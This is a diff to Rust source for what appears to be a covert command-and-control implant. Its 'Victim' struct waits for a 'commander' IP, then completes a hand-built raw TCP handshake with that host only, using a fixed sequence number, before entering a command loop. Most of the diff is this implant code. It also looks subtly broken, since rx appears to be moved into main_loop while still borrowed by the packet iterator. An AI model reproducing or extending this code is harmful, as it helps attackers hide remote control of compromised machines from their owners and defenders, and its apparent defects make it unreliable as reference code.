@@ -92,12 +92,64 @@ impl Victim {
 
     pub fn run(&mut self) {
         let (commander_ip, my_port, cmd_port) = self.wait_for_commander();
-        
-        let _hijacker = TcpListener::bind(format!("0.0.0.0:{}", my_port));
+
+        println!("[*] Entering RAW handshake mode on port {}", my_port);
+
         let protocol = Layer3(IpNextHeaderProtocols::Tcp);
-        let (tx, rx) = transport_channel(65535, protocol).expect("Root required");
-        
-        self.main_loop(tx, rx, commander_ip, my_port, cmd_port);
+        let (mut tx, mut rx) = transport_channel(4096, protocol).unwrap();
+        let mut packet_iter = pnet::transport::ipv4_packet_iter(&mut rx);
+
+        loop {
+            if let Ok((packet, _)) = packet_iter.next() {
+
+                if packet.get_source() != commander_ip {
+                    continue;
+                }
+
+                if let Some(tcp) = TcpPacket::new(packet.payload()) {
+
+                    if tcp.get_destination() == my_port &&
+                       tcp.get_flags() & pnet::packet::tcp::TcpFlags::SYN != 0 {
+
+                        println!("[+] SYN received from {}", commander_ip);
+
+                        let client_seq = tcp.get_sequence();
+                        let server_seq = 0x1337;
+
+                        // Build SYN-ACK
+                        let syn_ack = covert::build_syn_ack_packet(
+                            self.local_ip,
+                            commander_ip,
+                            my_port,
+                            tcp.get_source(),
+                            server_seq,
+                            client_seq.wrapping_add(1),
+                        );
+
+                        let _ = tx.send_to(
+                            pnet::packet::ipv4::Ipv4Packet::new(&syn_ack).unwrap(),
+                            IpAddr::V4(commander_ip)
+                        );
+
+                        println!("[+] SYN-ACK sent");
+
+                        // Wait for final ACK
+                        while let Ok((ack_pkt, _)) = packet_iter.next() {
+                            if let Some(ack_tcp) = TcpPacket::new(ack_pkt.payload()) {
+                                if ack_tcp.get_destination() == my_port &&
+                                   ack_tcp.get_flags() & pnet::packet::tcp::TcpFlags::ACK != 0 &&
+                                   ack_tcp.get_acknowledgement() == server_seq.wrapping_add(1) {
+
+                                    println!("[+] Raw handshake complete");
+                                    self.main_loop(tx, rx, commander_ip, my_port, cmd_port);
+                                    return;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
     }
 
     fn main_loop(&mut self, mut tx: TransportSender, mut rx: TransportReceiver, commander_ip: Ipv4Addr, my_port: u16, cmd_port: u16) {
